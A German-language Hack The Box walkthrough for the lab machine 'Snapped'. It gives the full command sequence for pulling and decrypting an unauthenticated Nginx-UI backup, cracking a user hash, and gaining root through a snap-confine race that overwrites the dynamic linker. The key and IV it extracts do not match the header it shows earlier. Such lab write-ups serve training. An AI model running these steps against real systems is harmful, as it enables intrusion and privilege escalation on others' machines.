# Hack The Box - Snapped (Deutsches Walkthrough)

## Synopsis

Snapped ist eine Hard-Maschine mit zwei aktuellen CVEs als Kern der Angriffskette. Der Initialzugriff nutzt `CVE-2026-27944` in Nginx-UI aus, bei der der Endpoint `/api/backup` ohne Authentifizierung erreichbar ist. Darüber lässt sich ein vollständiges Backup inklusive Schlüsselmaterial exfiltrieren, womit sich aus der Nginx-UI-Datenbank ein schwaches Benutzerpasswort entschlüsseln und cracken lässt.

Für Privilege Escalation wird `CVE-2026-3888` ausgenutzt, eine TOCTOU Race Condition zwischen `snap-confine` und `systemd-tmpfiles`, die über Namespace-Manipulation und Dynamic Linker Hijacking auf dem SUID-root-Binary `snap-confine` zu Root führt.

## Enumeration

### Nmap

```text
nmap -sCV 10.129.242.192
```

**Offene Ports:**
- 22/tcp SSH
- 80/tcp HTTP (nginx)

**Hosts ergänzen:**
```text
echo "10.129.242.192 snapped.htb" | sudo tee -a /etc/hosts
```

### Subdomain Enumeration

```text
ffuf -w /usr/share/wordlists/amass/bitquark_subdomains_top100K.txt -u http://FUZZ.snapped.htb -ic
```

**Treffer:**
- `admin.snapped.htb`

Auf `admin.snapped.htb` erscheint das Login-Portal von Nginx-UI.

## Initial Access

### API Enumeration

Beim Beobachten der Requests fällt `/api/install` auf.

**Weitere Enumeration:**
```text
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://admin.snapped.htb/api/FUZZ -ic
```

**Interessant:**
- `backup` → 200
- `licenses` → 200
- `settings` → 403

### Backup Endpoint testen

```text
curl -v http://admin.snapped.htb/api/backup
```

**Response Header:**
```text
X-Backup-Security: Cp47aVvbLc0r7xMzXABRe86PWv5pu85RmYVXjPFvZDk=:h+CtlLfVQ4/Y152zJ/G46g==
```

Das bestätigt `CVE-2026-27944`.

**Version verifizieren:**
```text
python3 discover.py --target http://admin.snapped.htb
```

- Vulnerable `<= 2.3.2`

### Backup exfiltrieren und entschlüsseln

**Backup laden:**
```text
curl -OJ -v http://admin.snapped.htb/api/backup
```

**Key und IV aus Header extrahieren:**
```text
key=$(echo 'Uggi+bPybhVny2dV+MaAVAkjSrzQBCjWFhbsenNiVJA=' | base64 -d | xxd -p -c 256)
iv=$(echo 'Jky/YQ0ISOX3gcTE9lj7zQ==' | base64 -d | xxd -p)
```

**Archiv entpacken:**
```text
unzip -d backup backup-20260319-121723.zip
```

**Nginx-UI Backup entschlüsseln:**
```text
cd backup
openssl enc -aes-256-cbc -d -in nginx-ui.zip -out nginxui_decrypted.zip -K $key -iv $iv
unzip nginxui_decrypted.zip
```

### Datenbank und Passwort-Crack

**SQLite öffnen:**
```text
sqlite3 database.db
.tables
select * from users;
```

**Interessanter Hash:**
```text
jonathan|$2a$10$8M7JZ...
```

**Cracken:**
```text
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
```

**Treffer:**
- `linkinpark`

**SSH Login:**
```text
ssh jonathan@snapped.htb
```

User-Access erreicht.

## Privilege Escalation

### Snapd prüfen

- `snapd 2.63.1+24.04`
- verwundbar gegenüber `CVE-2026-3888`

**Cleanup-Timer prüfen:**
```text
systemctl cat systemd-tmpfiles-clean.timer
cat /usr/lib/tmpfiles.d/tmp.conf
```

**Relevant:**
- `OnUnitActiveSec=1m`
- `D /tmp 1777 root root 4m`

Race-Bedingungen ideal.

### Exploit-Konzept

**Mimic Sequence:**
1. Bind-Mount nach `/tmp/.snap/usr/lib/x86_64-linux-gnu`
2. tmpfs-Mount
3. Bind-Mount einzelner Entries
4. unmount

Zwischen Schritt 1 und 3 wird per TOCTOU-Race manipuliert.

**Technik:**
- AF_UNIX Socket Backpressure bremst `snap-confine`
- `renameat2(RENAME_EXCHANGE)` tauscht Verzeichnisse atomar
- manipulierte Libraries landen im Namespace
- Dynamic Linker Hijack auf `ld-linux-x86-64.so.2`

### Schritt 1 - Sandbox betreten

**Terminal 1:**
```text
env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /bin/bash
cd /tmp
echo $$
```

PID merken.

### Schritt 2 - `.snap` löschen lassen

```text
while test -d ./.snap; do touch ./; sleep 1; done
```

Warten, bis `.snap` entfernt wurde.

### Schritt 3 - Namespace von außen betreten

**Terminal 2:**
```text
cd /proc/18606/cwd
systemd-run --user --scope --unit=snap.d$(date +%s) /bin/bash
env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base snapd snap.firefox.hook.configure /nonexistent
```

Fehler ist erwartet.

### Schritt 4 - Race gewinnen

**Helper kompilieren:**
```text
gcc -O2 -static -o firefox_2404 firefox_2404.c
gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell.c
```

**Ausführen:**
```text
~/firefox_2404 ~/payload.so
```

**Trigger:**
- `TRIGGER DETECTED`
- `SWAP DONE`

### Schritt 5 - Dynamic Linker überschreiben

**Terminal 3:**
```text
PID=$(cat /proc/1854/cwd/race_pid.txt)
cd /proc/$PID/root
cp /usr/bin/busybox ./tmp/sh
cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
```

### Schritt 6 - Root triggern

```text
env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22
```

Danach wird der manipulierte Linker geladen und Root-Code ausgeführt.

## Angriffskette Kurzüberblick

- Unauth Backup API
- Nginx-UI Backup Decryption
- Passwort-Crack für `jonathan`
- SSH Zugriff
- `snap-confine` TOCTOU Race
- Dynamic Linker Hijack
- Root
